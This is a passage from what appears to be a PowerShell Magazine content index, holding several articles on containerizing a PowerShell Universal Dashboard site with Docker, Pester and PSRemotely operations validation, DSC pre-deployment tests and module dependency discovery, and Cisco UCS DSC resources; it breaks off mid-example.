app and deploy code to a staging environment  #3 was used to build the demo website for this article, but in a production environment a more appropriate method would be to leverage continuous integration to deploy files to the website based on commits from source code.\nWe get many benefits from leveraging a PaaS offering such as Azure App Service:\n No servers to manage (no patching, monitoring, etc) We can add custom domains and SSL certificates as part of the service (bigger VM sizes) Scale in and out (more VM instances) Deploy the application using continuous delivery such as Visual Studio Team Services  There are also many other benefits such as pre-authentication, load balancing and more.\nContainerization Next, we will look at leveraging containers – a solution to the problem of how to get software to run reliably when moved from one computing environment to another.\nThis is a new technology with a promise to change the IT landscape the same way as virtualization did in the early 2000s.\nDeploy to a container running Windows Server Core Our first example of containerizing the PowerShell Universal Dashboard will be based on Windows Server Core, version 1709. Since we already have the application up and running on a native operating system, it should be easy in this case to transform it into a container.\nThe files for the following demos are available here.\nIn the WindowsServerCoreDemoWebsite, we have the following files:\ndashboard.ps1 and license.lic are the same files we used when running the application in a native operating system. These will be referenced in the Dockerfile to be copied into the container image.\nIn this example, we are using Docker – a container management tool – to build and deploy our demos. From the documentation:\nDocker can build images automatically by reading the instructions from a Dockerfile. A Dockerfile is a text document that contains all the commands a user could call on the command line to assemble an image. Using docker build users can create an automated build that executes several command-line instructions in succession.\nLet us have a look at the Dockerfile which defines our Windows Server Core, version 1709 demo website:\nWe are using an image from Docker Hub – a central repository for Docker images – which is built by Microsoft and have IIS pre-installed. Then we do not have to think about installing and configuring the Web-Server role.\nNext, we are downloading and installing the .NET Core Windows Server Hosting bundle like we did when running the application on a native operating system.\nPowerShellGet is used to download the UniversalDashboard module.\nThe last step is to copy the dashboard.ps1 and licence.lic files as well as exposing the port the website is running on.\ncd \u0026#34;~\\Git\\PSCommunity\\Containers\\PowerShell Universal Dashboard\u0026#34;  Note: Remember to switch to Windows Containers before building the docker file (Linux is the default after installing Docker for Windows)\n docker build WindowsServerCoreDemoWebsite -t psmag:demowebsite --no-cache docker build NanoDemoWebsite -t psmag:nanodemowebsite --no-cache #region 1 Windows Server Core $ContainerID = docker run -d --rm psmag:demowebsite $ContainerIP = docker inspect -f \u0026#34;{{ .NetworkSettings.Networks.nat.IPAddress }}\u0026#34; $ContainerID Verify that the website is up and running.\nStart-Process -FilePath iexplore.exe -ArgumentList http://$ContainerIP/register/123 Start-Process -FilePath chrome.exe -ArgumentList http://$ContainerIP/register/123 Optionally, connect to a container instance interactively to inspect the environment. The IIS image have a service monitor as an entrypint, thus we need to override this to get into the container interactively\ndocker run --entrypoint=powershell -it psmag:demowebsite docker stop $ContainerID #endregion #region 2 Nano Server 1709 $ContainerID = docker run -d --rm psmag:nanodemowebsite $ContainerIP = docker inspect -f \u0026#34;{{ .NetworkSettings.Networks.nat.IPAddress }}\u0026#34; $ContainerID Verify that the website is up and running.\nStart-Process -FilePath iexplore.exe -ArgumentList http://$ContainerIP/register/123 Start-Process -FilePath chrome.exe -ArgumentList http://$ContainerIP/register/123 Optionally, connect to the container instance interactively to inspect the environment\ndocker exec -ti $ContainerID pwsh #pwsh for Nano/powershell for Server Core docker stop $ContainerID #endregion When the Dockerfile is ready, we can user docker.exe to build a container image (line 4-5).\nWhen the image is successfully built, we are ready to test it by starting a container instance using our new image (line 8).\nIf you have made modifications to dashboard.ps1 or simply want the latest version of the UniversalDashboard module, re-run the docker build command and the image will be updated with any changes.\nDeploy to a container running Nano Server Before we try to make our demo application run on Nano Server, there are some important changes to Nano Server introduced in Windows Server 1709 to be aware of:\nStarting with the new feature release of Windows Server, version 1709, Nano Server will be available only as a container base OS image. You must run it as a container in a container host, such as a Server Core installation of Windows Server. Running a container based on Nano Server in the new feature release differs from earlier releases in these ways:\n Nano Server has been optimized for .NET Core applications. Nano Server is even smaller than the Windows Server 2016 version. PowerShell Core, .NET Core, and WMI are no longer included by default, but you can include PowerShell Core and .NET Core container packages when building your container. There is no longer a servicing stack included in Nano Server. Microsoft publishes an updated Nano container to Docker Hub that you redeploy. You troubleshoot the new Nano Container by using Docker. You can now run Nano containers on IoT Core.  One more thing that is useful to know, but not mentioned in the referenced article, is that IIS is not available in Nano Server 1709.\nThis means we need to take a different approach to get the application running in a Nano-based container.\nPowerShell Universal Dashboard is built on top of Kestrel – a cross-platform web server for ASP.NET Core. This means we can simply run Start-UDDashboard from PowerShell Core in Nano Server 1709 to get the web application up and running.\nRick Strahl has written a great article about Publishing and Running ASP.NET Core Applications with IIS where he mentions the following:\nKestrel is a .NET Web Server implementation that has been heavily optimized for throughput performance. It’s fast and functional in getting network requests into your application, but it’s ‘just’ a raw Web server. It does not include Web management services as a full featured server like IIS does. If you run on Windows you will likely want to run Kestrel behind IIS to gain infrastructure features like port 80/443 forwarding via Host Headers, process lifetime management and certificate management to name a few.\nThe bottom line for all of this is if you are hosting on Windows you’ll want to use IIS and the AspNetCoreModule.\nSome of the limitations can be overcome by leveraging different options such as a PaaS service or custom reverse proxy to publish the application externally, as well as a container orchestration tool such as Kubernetes for scaling and managing the application.\nWith these limitations in mind, let us go on and see if we can get this working on the latest version of Nano Server.\nAs mentioned previously, PowerShell Core has been removed from Nano Server starting with the 1709 release. The first step would be to build a new container image where PowerShell Core is included.\nLuckily, the PowerShell team have published the Dockerfile for the official Docker image for PowerShell Core on GitHub.\nIn our custom Dockerfile, we are leveraging almost all of the Dockerfile used to build PowerShell Core. We are also using the concept of multi stage builds to include ASP .NET Core by referencing FROM microsoft/aspnetcore:2.0-nanoserver-1709 in the Dockerfile.\nThe only code we need to add is to download the UniversalDashboard PowerShell module as well as copy the dashboard.ps1 file as we did when running on Server Core:\nWhen using IIS, licence.lic was automatically read by the application. This is not the case when using the module directly from PowerShell, hence we have added Set-UDLicense to specify the licence inside dashboard.ps1.\nSince IIS is not available, we need to add an entry point in the Dockerfile in order to launch the dashboard.ps1 file. This will launch the website by calling Start-UDDashboard.\nYou might notice that PowerShell Core is called by using pwsh.exe. With the release of PowerShell Core 6.0.0-beta.9 the binary for PowerShell Core was renamed from powershell.exe and powershell on Windows and Linux/Unix/macOS respectively to pwsh.exe and pwsh. Mark Kraus has written a great article with more background info about that change.\nA final note about Nano Server: On the Azure Marketplace offering for Windows Server, there is an offer called Windows Server Datacenter, version 1709 with Containers. If you deploy an instance of that image, Docker will be pre-installed and you can download the latest official Microsoft image of Nano Server from Docker Hub by running docker pull microsoft/nanoserver:1709.\nSummary In this article, we have explored various options for hosting a web application in different environments, starting with a native operating system and ending up with a very small container image based on Nano Server.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/11/20/containerizing-a-web-application/","tags":["Containers","How To"],"title":"Containerizing a web application"},{"categories":["Pester","DevOps","Module Spotlight"],"contents":"Introduction After setting up the context in the previous post, it is time to look at how the authoring workflow looks like when using Pester for writing operations validation tests, to begin with, and then leveraging PSRemotely DSL to target it to the remote nodes.\nThis workflow consists of below stages:\n Getting your tests ready, target/test a single node. Prepare configuration data (abstract hardcoded values). Use PSRemotely for remote operations validation. Debugging failures. Reporting.   Note – Stages 1-3 will be covered in this post and there will be another post on Stages 4 \u0026amp; 5.\n Since PSRemotely was born out of needs for validating an engineered solution, it excels at validating solutions e.g. where the nodes are consistent in behavior and have to be tested for the similar configurations.\nScenario To illustrate the point, I am taking an example of deploying the Hyper-converged solution using Storage Spaces Direct. Now as per the referenced article the deployment has three stages:\n Deploy Windows Server Configure the Network Configure Storage Spaces Direct  Ideally, the operations validation should run after each step to validate that the entire solution is being configured as per the best practice. To keep today’s post simple, we will be validating only the first step which deploying Windows server but the similar steps apply while authoring the validation tests for the other stages in the deployment workflow.\nNow take a look at the referenced link and gather the list of configurations that need to be in place on each node as per the step 1.\n Deploy Windows Server 2016. Verify the domain account is a member of the local administrator group.  So now we have the configurations we need to check on each node just before we configure networking on top of them. You can follow the commits on this branch on this test repository to see the changes made as part of the authoring workflow.\nStage 1 – Get your tests ready This stage consists of authoring tests using Pester/PoshSpec for operations validations.\nLet us start by translating the above gathered configurations in Pester Describe blocks independently, to begin with.\nBelow is a very crude way that can be used to determine that Windows Server 2016 is installed on the node. There are two Pester assertions –. First one asserts that OS type is a server and the OS SKU is either datacenter edition with GUI or server core.\n# Ensure that Server 2016 OS installation is done. Describe \u0026#34;Operating system installed validation\u0026#34; { $OS = Get-CimInstance -Class Win32_OperatingSystem Context \u0026#34;Server Type check\u0026#34; { It \u0026#34;Should have the OSType as WinNT\u0026#34; { $OS.OSType | Should Be 18 } } Context \u0026#39;Server 2016 check\u0026#39; { It \u0026#34;Should have server 2016 installed\u0026#34; { $OS.Caption | Should BeLike \u0026#39;*Server 2016*\u0026#39; } } } Here is another independent test for validating that the domain account is a member of the local administrators group on a node.\n# Validate that the domain account is part of the local administrators group on a node. Describe \u0026#34;Domain account is local administrator validation\u0026#34; { $LocalGroupMember = Get-LocalGroupMember -Group Administrators -Member \u0026#34;S2DClusterAdmin\u0026#34; -ErrorAction SilentlyContinue It \u0026#34;Should be member of local admins group\u0026#34; { $LocalGroupMember | Should NOT BeNullOrEmpty } } Stage 2 – Prepare node configuration data If you look at the authored Pester describe blocks to validate the configuration on the nodes, it might use environment specific data hard coded into the tests e.g. domain username in above example.\nSo we need to now collect all this data which is environment specific and decouple it from our tests.\nStart with the below empty configuration data (place it in the EnvironmentConfigData.psd1 file) and start populating it (it follows the DSC style configuration data syntax).\n@{ AllNodes = @( @{ # common node information hashtable NodeName = \u0026#39;*\u0026#39;; # do not edit }, @{ # Individual node information hashtable NodeName = \u0026#39;Node1\u0026#39; }, @{ NodeName = \u0026#39;Node2\u0026#39; }, @{ NodeName = \u0026#39;Node3\u0026#39; }, @{ NodeName = \u0026#39;Node4\u0026#39; } ) } Start by placing them inside the node configuration data with a general thumb rule of mapping common data to common node information hashtable and node specific details to node configuration hashtable.\nNow in the previous tests, the only input is the domain user name. So we can add that to common node information hashtable, since the domain user is a member of the local administrators group needs to be validated on all the nodes in the solution. So now the configuration data looks like below:\n@{ AllNodes = @( @{ # common node information hashtable NodeName = \u0026#39;*\u0026#39;; # do not edit DomainUser = \u0026#39;S2DClusterAdmin\u0026#39; }, @{ # Individual node information hashtable NodeName = \u0026#39;Node1\u0026#39; }, @{ NodeName = \u0026#39;Node2\u0026#39; }, @{ NodeName = \u0026#39;Node3\u0026#39; }, @{ NodeName = \u0026#39;Node4\u0026#39; } ) } Stage 3 – Using PSRemotely for remote ops validation At this stage in the authoring workflow, we have our tests ready along with the environment configuration data in hand. Before using PSRemotely to target all the nodes for deployment readiness we have to ask this question, How do we connect over PSRemoting to these nodes?\n Are the nodes domain joined? Connect using the DNS name resolution or IPv4/IPv6 addresses for the remote nodes? Connect using the logged in user account or specifying an alternate account?  Based on the answers to the above questions usage with PSRemotely DSL varies a bit and most of them are documented. For this scenario, the DNS Name resolution of the nodes is used (nodes are already domain joined) and the logged in user account will be used to connect to the remote nodes.\nNow it is time to wrap our existing operations validation tests inside the PSRemotely DSL. The DSL consists of two keywords PSRemotely and Node. PSRemotely is the outermost keyword which allows the framework to:\n Specify that all ops validations tests are housed inside a .PSRemotely.ps1 file. Specify the environment configuration data e.g. hashtable/ .psd1 file/ .json file. Specify credentials to be used to connect to the each node (if required). Specify a node specific property in the configuration data to be used for initiating the PSRemoting session. Populate custom variables in the remote node’s execution context.  Node keyword is where we target and organize our tests based on some environment specific data, it is very similar to the Node keyword in the DSC. If you would like to target different validations to nodes based on some configuration data then it can be done using the Node keyword.\nGetting back to the problem at hand let’s wrap our existing Pester tests inside the PSRemotely DSL. This is straightforward for the problem at hand and looks like below. We can save the contents of below code snippet in a file called S2DValidation.PSRemotely.ps1 (PSRemotely only accepts file with .PSRemotely.ps1 extension).\n Take note of how the hard coded value for domain username (S2DClusterAdmin) from the standalone Pester tests is replaced with node specific configuration data e.g. $Node.DomainUser.\n # Use the PSRemotely DSL to wrap the existing Pester tests and target remote nodes PSRemotely -Path \u0026#34;$PSScriptRoot\\EnvironmentConfigData.psd1\u0026#34; { # All the nodes in the solution are to be targeted Node $AllNodes.NodeName { # Ensure that Server 2016 OS installation is done. Describe \u0026#34;Operating system installed validation\u0026#34; { $OS = Get-CimInstance -Class Win32_OperatingSystem Context \u0026#34;Server Type check\u0026#34; { It \u0026#34;Should have the OSType as WinNT\u0026#34; { $OS.OSType | Should Be 18 } } Context \u0026#39;Server 2016 check\u0026#39; { It \u0026#34;Should have server 2016 installed\u0026#34; { $OS.Caption | Should BeLike \u0026#39;*Server 2016*\u0026#39; } } } # Validate that the domain account is part of the local administrators group on a node. Describe \u0026#34;Domain account is local administrator validation\u0026#34; { $LocalGroupMember = Get-LocalGroupMember -Group Administrators -Member \u0026#34;$($Node.DomainUser)\u0026#34; -ErrorAction SilentlyContinue It \u0026#34;Should be member of local admins group\u0026#34; { $LocalGroupMember | Should NOT BeNullOrEmpty } } } } We are all set and have two files in the directory e.g. EnvironmentConfigData.psd1 and S2DValidation.PSRemotely.ps1, it is finally time to invoke PSRemotely and give remote operations validation a go.\nWe can use Invoke-PSRemotely in the current directory to run all the operations validation housed inside it or specify a path to a file ending with *.PSRemotely.ps1 extension.\n  As shown in the above video, for each node targeted a JSON object is returned. In the returned JSON object the property Status is true if all the tests (Describe blocks) passed on the remote node. Tests property is an array of individual tests (Describe block) run on the Remotely node if all the tests pass then an empty JSON object array of TestResult is returned otherwise the Error record thrown by Pester is returned.\nFor the node which failed one of the validations, the JSON object looks like below. Individual TestResult will contain more information on the failing tests on the remote nodes.\nFor the failed node, we can quickly verify that out of the two validations targeted at the remote node only one is failing.\nNow there could be a lot many reasons on why the operation validations tests on the remote node are failing. In the next post, we will take a look at how to connect to the underlying PSSession being used by PSRemotely to debug these failures.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/06/29/psremotely-authoring-workflow-part-1/","tags":["DevOps","Pester","Modules"],"title":"PSRemotely – Authoring workflow (Part 1)"},{"categories":["DevOps","Pester","PowerShell DSC"],"contents":"In one of my earlier articles here, I wrote about the Infrastructure Blueprints project. Over the weekend, I published an update this project.\n Renamed Hyper-VConfigurations composite resource module to HyperVConfigurations. This is a breaking change. Added SystemConfigurations composite resource module containing one composite configuration that includes domain join, remote desktop, timezone, and IE enhanced security configurations. Added Pre-Deploy tests under Diagnostics for each composite resource.  Let’s come to the subject of today’s post. In any infrastructure that you are deploying, even f you are no automation guy, there will be a set of prerequisite checks you would perform. For example, if your goal is to deploy a switch embedded team for a Hyper-V host configuration, you will have to check for the existence of physical network adapters in the system that you plan to use within the SET configuration. And, there will be many such pre-deployment checks that you need to perform. So, when using these infrastructure blueprints, it is ideal to package the pre-deployment tests as well into the composite resource module itself.\nTo address this need, I added PreDeploy scripts under diagnostics tests for each composite resource.\nThe PreDeploy folder is where all my pre-deployment tests are stored. Here is the pre-deployment test script for the SET team.\nDescribe \u0026#39;Predeploy tests for Hyper-V Deployment with Switch Embedded Teaming and related network Configuration\u0026#39; { Context \u0026#34;Operating System verison tests\u0026#34; { $OS = Get-CimInstance -Class Win32_OperatingSystem It \u0026#34;Should have the OSType as WinNT\u0026#34; { $OS.OSType | Should Be 18 } It \u0026#34;Should have server 2016 installed\u0026#34; { $OS.Caption | Should BeLike \u0026#39;*Server 2016*\u0026#39; } } Context \u0026#39;Network adapters should exist\u0026#39; { Foreach ($adapter in $configurationData.AllNodes.NetAdapterName) { It \u0026#34;Network adapter named \u0026#39;$adapter\u0026#39; should exist\u0026#34; { Get-NetAdapter -Name $adapter -ErrorAction SilentlyContinue | Should Not BeNullOrEmpty } } } } In the above test scripts, we check that the OS version is indeed Windows Server 2016 to ensure SET configuration can be deployed. Also, we check for the presence of physical network adapters listed in the configuration data to ensure that the SET configuration completes with no errors.\nThe above flow summarizes the deployment workflow. We execute the pre-deployment tests first and perform deployment only once these tests are all successful. Once the deployment is complete, we run either comprehensive or simple operations tests and put the system into operations only when these tests are successful.\nWhatever orchestration script or method that you plan to use, putting this workflow into the process will certainly help you build a resilient deployment pipeline.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/06/28/infrastructure-blueprints-adding-pre-deployment-validations/","tags":["DevOps","Pester","PowerShell DSC"],"title":"Infrastructure Blueprints – Adding Pre-deployment Validations"},{"categories":["PowerShell DSC"],"contents":"If you have ever used the Publish-AzureRmVMDscConfiguration cmdlet in the Azure PowerShell tools, you may know already that this command discovers module dependencies for a configuration and packages all dependencies along with the configuration as a zip archive.\nPublish-AzureRmVMDscConfiguration \u0026#34;.\\MyConfiguration.ps1\u0026#34; -OutputArchivePath \u0026#34;.\\MyConfiguration.ps1.zip\u0026#34; When I first used this cmdlet, I felt this was really a good idea for on-premise build processes and immediately tried to find out how they discover module dependencies. I was almost certain that it was not just text parsing but may be a little bit more than that. This exploration lead me to the source code for this cmdlet and I certainly saw lot of traces towards AST being used.\nThe second instance that I came across the usage of AST in finding resource module dependencies was in the Configuration function in the PSDesiredStateConfiguration module. This function, starting from WMF 5.0, has a runtime parameter called ResourceModulesTuplesToImport. PS C:\\\u0026gt; (Get-Command Configuration | Select-Object -ExpandProperty Parameters).ResourceModuleTuplesToImport Name : ResourceModuleTuplesToImport ParameterType : System.Collections.Generic.List`1[System.Tuple`3[System.String[],Microsoft.PowerShell.Commands.ModuleSpecification[],System.Version]] ParameterSets : {[__AllParameterSets, System.Management.Automation.ParameterSetMetadata]} IsDynamic : False Aliases : {} Attributes : {__AllParameterSets, System.Management.Automation.ArgumentTypeConverterAttribute} SwitchParameter : False The argument for the ResourceModulesTuplesToImport gets populated at runtime — when a Configuration gets loaded for the first time. To be specific, when you create a configuration document and load it into the memory, AST gets triggered and populates the argument to this parameter. You can trace this back to ast.cs. Here is a part of that.\n/////////////////////////// // get import parameters var bodyStatements = Body.ScriptBlock.EndBlock.Statements; var resourceModulePairsToImport = new List\u0026lt;Tuple\u0026gt;string[], ModuleSpecification[], Version(); var resourceBody = (from stm in bodyStatements where !IsImportCommand(stm, resourceModulePairsToImport) select (StatementAst)stm.Copy()).ToList(); So, the whole magic of deriving the dependent modules is happening in the IsImportCommand method. Once I reviewed the code there, it wasn’t tough to reverse engineer that into PowerShell.\nI published my scripts to https://github.com/rchaganti/PSDSCUtils. Let’s take a look at the script now.\n[CmdletBinding()] param ( [Parameter(Mandatory)] [String] $ConfigurationScript, [Parameter()] [Switch] $Package, [Parameter()] [String] $PackagePath ) $ConfigurationScriptContent = Get-Content -Path $ConfigurationScript -Raw $ast = [System.Management.Automation.Language.Parser]::ParseInput($ConfigurationScriptContent, [ref]$null, [ref]$null) $configAst = $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.ConfigurationDefinitionAst]}, $true) $moduleSpecifcation = @() foreach ($config in $configAst) { $dksAst = $config.FindAll({ $args[0] -is [System.Management.Automation.Language.DynamicKeywordStatementAst]}, $true) foreach ($dynKeyword in $dksAst) { [System.Management.Automation.Language.CommandElementAst[]] $cea = $dynKeyword.CommandElements.Copy() $allCommands = [System.Management.Automation.Language.CommandAst]::new($dynKeyword.Extent, $cea, [System.Management.Automation.Language.TokenKind]::Unknown, $null) foreach ($importCommand in $allCommands) { if ($importCommand.CommandElements[0].Value -eq \u0026#39;Import-DscResource\u0026#39;) { [System.Management.Automation.Language.StaticBindingResult]$spBinder = [System.Management.Automation.Language.StaticParameterBinder]::BindCommand($importCommand, $false) $moduleNames = \u0026#39;\u0026#39; $resourceNames = \u0026#39;\u0026#39; $moduleVersion = \u0026#39;\u0026#39; foreach ($item in $spBinder.BoundParameters.GetEnumerator()) { $parameterName = $item.key $argument = $item.Value.Value.Extent.Text #Check if the parametername is Name $parameterToCheck = \u0026#39;Name\u0026#39; $parameterToCheckLength = $parameterToCheck.Length $parameterNameLength = $parameterName.Length if (($parameterNameLength -le $parameterToCheckLength) -and ($parameterName.Equals($parameterToCheck.Substring(0,$parameterNameLength)))) { $resourceNames = $argument.Split(\u0026#39;,\u0026#39;) } #Check if the parametername is ModuleName $parameterToCheck = \u0026#39;ModuleName\u0026#39; $parameterToCheckLength = $parameterToCheck.Length $parameterNameLength = $parameterName.Length if (($parameterNameLength -le $parameterToCheckLength) -and ($parameterName.Equals($parameterToCheck.Substring(0,$parameterNameLength)))) { $moduleNames = $argument.Split(\u0026#39;,\u0026#39;) } #Check if the parametername is ModuleVersion $parameterToCheck = \u0026#39;ModuleVersion\u0026#39; $parameterToCheckLength = $parameterToCheck.Length $parameterNameLength = $parameterName.Length if (($parameterNameLength -le $parameterToCheckLength) -and ($parameterName.Equals($parameterToCheck.Substring(0,$parameterNameLength)))) { if (-not ($moduleVersion.Contains(\u0026#39;,\u0026#39;))) { $moduleVersion = $argument } else { throw \u0026#39;Cannot specify more than one moduleversion\u0026#39; } } } #Get the module details #\u0026#34;Module Names: \u0026#34; + $moduleNames #\u0026#34;Resource Name: \u0026#34; + $resourceNames #\u0026#34;Module Version: \u0026#34; + $moduleVersion  if($moduleVersion) { if (-not $moduleNames) { throw \u0026#39;-ModuleName is required when -ModuleVersion is used\u0026#39; } if ($moduleNames.Count -gt 1) { throw \u0026#39;Cannot specify more than one module when ModuleVersion parameter is used\u0026#39; } } if ($resourceNames) { if ($moduleNames.Count -gt 1) { throw \u0026#39;Cannot specify more than one module when the Name parameter is used\u0026#39; } } #We have multiple combinations of parameters possible #Case 1: All three are provided: ModuleName,ModuleVerison, and Name #Case 2: ModuleName and ModuleVersion are provided #Case 3: Only Name is provided #Case 4: Only ModuleName is provided #Case 1, 2, and 3 #At the moment, there is no error check on the resource names supplied as argument to -Name if ($moduleNames) { foreach ($module in $moduleNames) { if (-not ($module -eq \u0026#39;PSDesiredStateConfiguration\u0026#39;)) { $moduleHash = @{ ModuleName = $module } if ($moduleVersion) { $moduleHash.Add(\u0026#39;ModuleVersion\u0026#39;,$moduleVersion) } else { $availableModuleVersion = Get-RecentModuleVersion -ModuleName $module $moduleHash.Add(\u0026#39;ModuleVersion\u0026#39;,$availableModuleVersion) } $moduleInfo = Get-Module -ListAvailable -FullyQualifiedName $moduleHash -Verbose:$false -ErrorAction SilentlyContinue if ($moduleInfo) { #TODO: Check if listed resources are equal or subset of what module exports $moduleSpecifcation += $moduleInfo } else { throw \u0026#34;No module exists with name ${module}\u0026#34; } } } } #Case 2 #Foreach resource, we need to find a module if ((-not $moduleNames) -and $resourceNames) { $moduleHash = Get-DscModulesFromResourceName -ResourceNames $resourceNames -Verbose:$false foreach ($module in $moduleHash) { $moduleInfo = Get-Module -ListAvailable -FullyQualifiedName $module -Verbose:$false $moduleSpecifcation += $moduleInfo } } } } } } if ($Package) { #Create a temp folder $null = mkdir \u0026#34;${env:temp}\\modules\u0026#34; -Force -Verbose:$false #Copy all module folders to a temp folder foreach ($module in $moduleSpecifcation) { $null = mkdir \u0026#34;${env:temp}\\modules\\$($module.Name)\u0026#34; Copy-Item -Path $module.ModuleBase -Destination \u0026#34;${env:temp}\\modules\\$($module.Name)\u0026#34; -Container -Recurse -Verbose:$false } #Create an archive with all needed modules Compress-Archive -Path \u0026#34;${env:temp}\\modules\u0026#34; -DestinationPath $PackagePath -Force -Verbose:$false #Remove the folder Remove-Item -Path \u0026#34;${env:temp}\\modules\u0026#34; -Recurse -Force -Verbose:$false } else { return $moduleSpecifcation } function Get-DscModulesFromResourceName { [CmdletBinding()] param ( [Parameter(Mandatory)] [string[]] $ResourceNames ) process { $moduleInfo = Get-DscResource -Name $ResourceNames -Verbose:$false | Select -Expand ModuleName -Unique $moduleHash = @() foreach ($module in $moduleInfo) { $moduleHash += @{ ModuleName = $module ModuleVersion = (Get-RecentModuleVersion -ModuleName $module) } } return $moduleHash } } function Get-DscResourcesFromModule { [CmdletBinding()] param ( [Parameter(Mandatory)] [String] $ModuleName, [Parameter()] [Version] $ModuleVersion ) process { $resourceInfo = Get-DscResource -Module $ModuleName -Verbose:$false if ($resourceInfo) { if ($ModuleVersion) { $resources = $resourceInfo.Where({$_.Module.Version -eq $ModuleVersion}) return $resources.Name } else { #check if there are multiple versions of the modules; if so, return the most recent one $mostRecentVersion = Get-RecentModuleVersion -ModuleName $ModuleName Get-DscResourcesFromModule -ModuleName $ModuleName -ModuleVersion $mostRecentVersion } } } } function Get-RecentModuleVersion { [CmdletBinding()] param ( [Parameter(Mandatory)] [String] $ModuleName ) process { $moduleInfo = Get-Module -ListAvailable -Name $ModuleName -Verbose:$false | Sort -Property Version if ($moduleInfo) { return ($moduleInfo[-1].Version).ToString() } } } Here is how you used this script:\nWith just the -ConfigurationScript parameter, this script emits a ModuleInfo object that contains a list of modules that are being imported in the configuration script.\nIn case you need to package the modules into a zip archive, you can use the -Package and -PackagePath parameters.\n.\\Get-DSCResourceModulesFromConfiguration.ps1 -ConfigurationScript C:\\Scripts\\VMDscDemo.ps1 -Package -PackagePath C:\\Scripts\\modules.zip There are many uses cases for this. I use this extensively in my Hyper-V lab configurations. What are your use cases?\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/06/27/discover-and-package-dependent-resource-modules-for-a-psdsc-configuration/","tags":["PowerShell DSC"],"title":"Discover and Package Dependent Resource Modules for a #PSDSC Configuration"},{"categories":["PowerShell DSC"],"contents":"The Cisco UCS PowerTool Suite is a set of PowerShell modules for Cisco UCS Manager, Cisco IMC (C-Series stand-alone servers) and Cisco UCS Central that helps in configuration and management of Cisco UCS domains and solutions. The Cisco UCS PowerTool Suite 2.0.1 release added a new module Cisco.Ucs.DesiredStateConfiguration which consists of custom resources for configuring Cisco UCS Manager and Cisco IMC using the PowerShell DSC platform. You can download the latest version of the UCS PowerTool Suite from cisco.com. Refer to Cisco UCS PowerTool Suite page on Cisco Communities for more resources.\nPowerShell Desired State Configuration (DSC) is a management platform which enables you to configure, deploy, and manage systems. DSC provides declarative, autonomous and idempotent deployment, configuration and conformance for standards-based managed elements. For more information on DSC refer to the PowerShell DSC documentation.\nCisco UCS DSC Resource aids in achieving Configuration as Code in turn helping you to follow the DevOps model.\nThe Cisco UCS DSC module provides six DSC custom resources which cover the majority of use cases. You can view the custom UCS resources by running the Get-DscResource cmdlet as shown below.\nSolution Architecture Overview Before getting in to the details of the resources let’s review some basic concepts of DSC and the overall architecture of the UCS PowerTool DSC solution.\nThe DSC management platform consists of three main components.\n Configuration: This is where you define the configurations that need to be applied in a declarative manner. Once you run this configuration, DSC will take care of ensuring the system is in the state that is defined in the configuration. Resources: These are the building blocks for the configurations. Local Configuration Manager (LCM): This is the engine that facilitates the interaction between resources and configurations. The LCM regularly polls the state of the system and takes appropriate actions based on the resource. The LCM runs on every target node.  In DSC there are two ways to deploy a configuration.\n Push Mode – Push mode is a manual deployment of DSC resources to target nodes. Once the configuration is compiled the user runs the Start-DscConfiguration cmdlet to push the configuration to the desired nodes. Pull Mode – Pull mode configures nodes to check in to a DSC web pull server to retrieve the configuration files. When a new configuration is available, the LCM downloads and applies it to the target node.  To utilize DSC functionality with Cisco UCS Manager or Cisco IMC an intermediate server is required. The intermediate server is a Windows Server having the required Windows Management Framework (WMF), PowerShell and the UCS PowerTool Suite installed. A typical architecture is shown in the figure.\nCentral Server—This server is used to write the UCS DSC configuration scripts for Cisco UCS Manager or Cisco IMC. This can be configured as a pull server if the method of deployment is Pull Mode.\nIntermediate Server— The Central server deploys the configuration to the Intermediate server. This server applies the configuration to the Cisco UCS Manager or Cisco IMC using the UCS PowerTool DSC cmdlets.\nCisco UCS Manager DSC Resources There are four custom resources provided for configuring Cisco UCS Manager.\n UcsSyncMoWithReference: This resource syncs configuration from a reference UCS Manager to any target UCS Managers. UcsManagedObject: This resource configures any UCS Manager Managed Object (MO) by specifying the MO details. UcsScript: This resource allows for the execution of UCS Manager PowerTool cmdlets. UcsSyncFromBackup: This resource applies configuration from a backup file to any target UCS Managers.  Generating DSC configuration document for UCS Manager GUI operations To simplify the process of authoring the DSC configuration documents for UCS Manager use the ConvertTo-UcsDscConfig cmdlet. This cmdlet is similar to the ConvertTo-UcsCmdlet cmdlet that generates the UCS PowerTool cmdlets for the actions performed on the UCS Manager GUI. Creating a configuration document is a simple two-step process.\n Launch the UCS Manager GUI, either using the Start-UcsGuiSession cmdlet or manually, then run the ConvertTo-UcsDscConfig cmdlet, if -OutputFilePath is supplied the DSC configuration will be written to the specified file, otherwise the ConvertTo-UcsDscConfig cmdlet will produce output to the UCS PowerTool console session. Create the required configuration using the UCS Manager GUI. When you are done creating configurations you can open the input file specified in the step 1. The required DSC configuration document will have been auto-generated. If no output file was specified, cut and paste the UCS PowerTool console output to a file.  Once you have the auto-generated document you just need to customize a few environment-related settings like Configuration Data, UCS Manager connection details and Credentials.\nUcsSyncMoWithReference Custom Resource If you have more than one UCS domain in your datacenter and want to maintain a baseline configuration across all the UCS domains use the UcsSyncMoWithReference resource.\nYou can create a configuration using this resource by specifying the Distinguished Name (DN) of the Managed Object (MO) that needs to be synced. Here is an example of how you can sync a Service Profile, Service Profile Template, and LDAP Groups.\nUcsSyncMoWithReference SyncServiceProfile { UcsCredentials = $ucsCredential UcsConnectionString = $ucsConnString RefUcsCredentials = $refUcsCredential RefUcsConnectionString = $refUcsConString Ensure=\u0026#34;Present\u0026#34; Identifier =\u0026#34;2\u0026#34; Hierarchy=$true Dn = \u0026#34;org-root/ls-SPExchangeServer\u0026#34; } UcsSyncMoWithReference SyncSpTemplate { UcsCredentials = $ucsCredential UcsConnectionString = $ucsConnString RefUcsCredentials = $refUcsCredential RefUcsConnectionString = $refUcsConString Ensure=\u0026#34;Present\u0026#34; Identifier =\u0026#34;3\u0026#34; Hierarchy=$true Dn = \u0026#34;org-root/ls-SPTSqlServer\u0026#34; } UcsSyncMoWithReference SyncLDAPGroups { UcsCredentials = $ucsCredential UcsConnectionString = $ucsConnString RefUcsCredentials = $RefUcsCredential RefUcsConnectionString = $refUcsConString Ensure=\u0026#34;Present\u0026#34; 